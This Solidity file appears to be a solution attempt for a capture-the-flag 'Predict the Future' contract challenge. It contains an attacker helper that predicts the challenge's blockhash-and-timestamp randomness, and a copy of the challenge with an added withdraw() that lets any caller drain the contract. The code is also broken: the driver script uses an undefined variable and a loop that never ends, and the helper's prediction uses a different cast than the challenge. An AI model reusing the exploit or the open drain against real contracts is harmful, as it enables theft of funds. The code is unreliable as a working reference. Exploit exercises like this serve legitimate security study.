pragma solidity ^0.4.21;

/*
const oneEth = web3.utils.toWei('1', 'ether');
var predictTheFutureChallenge = await PredictTheFutureChallenge.deployed();
var predictHelper = await PredictHelper.deployed();

var blockNumTarget = await web3.eth.getBlockNumber() + 2;
var answer = await predictHelper.getAnswer(blockNumTarget);
await predictHelper.lockInGuess(answer, {from: accounts[0], value: oneEth});
var blockNumCurrent = await web3.eth.getBlockNumber();
while (blockNumCurrent < blockNumberTarget) {
    await predictHelper.wasteBlock();
}
await predictHelper.settle();
await predictHelper.isComplete();
*/

contract PredictHelper {
    uint8 waste;
    address otherContract;

    function setOtherContract(address newAddr) public {
        otherContract = newAddr;
    }

    function getOtherContract() public view returns (address) {
        return otherContract;
    }

    function getAnswer(uint256 blockNum) public view returns (uint256) {
        return uint256(keccak256(block.blockhash(blockNum - 1), now)) % 10;
    }

    function wasteBlock() public {
        waste += 1;
    }

    function() public payable { 
    }

    function isComplete() public view returns (bool) {
        PredictTheFutureChallenge predictTheFutureChallenge = PredictTheFutureChallenge(otherContract);
        return predictTheFutureChallenge.isComplete();
    }
    
    function lockInGuess(uint8 n) public payable {
        PredictTheFutureChallenge predictTheFutureChallenge = PredictTheFutureChallenge(otherContract);
        predictTheFutureChallenge.lockInGuess.value(1 ether)(n);
    }
    
    function settle() public {
        PredictTheFutureChallenge predictTheFutureChallenge = PredictTheFutureChallenge(otherContract);
        predictTheFutureChallenge.settle();
    }

    function withdraw() public {
        PredictTheFutureChallenge predictTheFutureChallenge = PredictTheFutureChallenge(otherContract);
        predictTheFutureChallenge.withdraw();
        msg.sender.transfer(address(this).balance);
    }
}

contract PredictTheFutureChallenge {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    event LockInGuess(address guesser, uint8 guess, uint256 blocknumber, uint256 settlementBlockNumber);
    event Settle(address guesser,uint8  answer, uint256 blocknumber, uint256 settlementBlockNumber);

    function PredictTheFutureChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
        emit LockInGuess(guesser, guess, block.number, settlementBlockNumber);
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        emit Settle(guesser, answer, block.number, settlementBlockNumber);
        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }

    function withdraw() public {
        msg.sender.transfer(address(this).balance);
    }
}
